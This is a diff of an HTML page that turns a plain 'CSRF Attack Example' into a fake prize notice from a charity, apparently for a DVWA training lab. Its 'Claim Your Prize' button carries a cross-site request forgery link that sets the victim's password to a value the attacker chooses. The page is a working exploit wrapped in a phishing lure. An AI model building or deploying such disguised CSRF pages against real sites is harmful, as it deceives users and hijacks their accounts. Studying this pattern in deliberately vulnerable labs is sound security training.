@@ -3,13 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Attack Example</title>
+    <title>Congratulations! You've Won a Prize</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 500px;
+            margin: auto;
+        }
+        h1 {
+            color: #28a745;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background-color: #28a745;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            font-size: 18px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #218838;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Click here </h1>
-    <a href="http://wangehacker.cn/DVWA/vulnerabilities/csrf/?password_new=amir&password_conf=amir&Change=Change#">click me</a>   
-        <script>
-        // Alternatively, you can redirect the user to the malicious URL
-    </script>
+    <div class="container">
+        <img src="https://via.placeholder.com/150" alt="Charity Logo" class="logo">
+        <h1>Congratulations!</h1>
+        <p>You have been selected to receive a special donation from our charity. Click the button below to claim your prize.</p>
+        <a class="btn" href="http://wangehacker.cn/DVWA/vulnerabilities/csrf/?password_new=amir&password_conf=amir&Change=Change#">Claim Your Prize</a>   
+    </div>
 </body>
 </html>
